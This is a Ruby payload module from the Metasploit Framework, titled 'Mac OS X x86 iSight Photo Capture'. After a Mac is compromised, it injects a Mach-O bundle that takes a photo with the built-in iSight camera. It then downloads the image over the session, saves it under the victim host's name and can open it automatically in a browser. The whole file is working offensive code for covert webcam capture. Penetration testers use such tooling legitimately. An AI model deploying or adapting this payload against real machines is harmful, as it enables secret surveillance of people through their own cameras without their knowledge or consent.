##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'msf/core/payload/osx/bundleinject'
require 'msf/base/sessions/vncinject'
require 'fileutils'
require 'rex/compat'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

###
#
# Injects the VNC server DLL and runs it over the established connection.
#
###
module Metasploit3

	include Msf::Payload::Osx::BundleInject
	include Msf::Sessions::CommandShellOptions

	def initialize(info = {})
		super(update_info(info,
			'Name'          => 'Mac OS X x86 iSight Photo Capture',
			'Description'   => 'Inject a Mach-O bundle to capture a photo from the iSight (staged)',
			'Author'        => 'ddz',
			'License'       => MSF_LICENSE,
			'Session'       => Msf::Sessions::CommandShell))

		# Override the BUNDLE path with the iSight capture library
		register_options(
			[
				OptPath.new('BUNDLE',
					[
						true,
						"The local path to the iSight Mach-O Bundle to upload",
						File.join(Msf::Config.install_root, "data", "isight.bundle")
					]),
				OptBool.new('AUTOVIEW',
					[
						true,
						"Automatically open the picture in a browser ",
						true
					])
			], self.class)
	end

	def on_session(session)
		print_status("Downloading photo...")

		photo_length = session.rstream.read(4).unpack('V')[0]

		print_status("Downloading photo (#{photo_length} bytes)...")


		photo = ""
		while(photo.length < photo_length)
			buff = session.rstream.get_once(-1, 5)
			break if not buff
			photo << buff
		end

		# Extract the host and port
		host = session.session_host

		# Create a directory for the images
		base = File.join(Msf::Config.config_directory, 'logs', 'isight')
		dest = File.join(base,
			host + "_" + Time.now.strftime("%Y%m%d.%M%S")+sprintf("%.5d",rand(100000))+".jpg"
		)

		# Create the log directory
		FileUtils.mkdir_p(base)
		File.open(dest, 'wb') do |f|
			f.write(photo)
			f.flush
		end

		print_status("Photo saved as #{dest}")

		if (datastore['AUTOVIEW'] == true)
			print_status("Opening photo in a web browser...")
			Rex::Compat.open_browser(File.expand_path(dest))
		end

		super(session)
	end

end
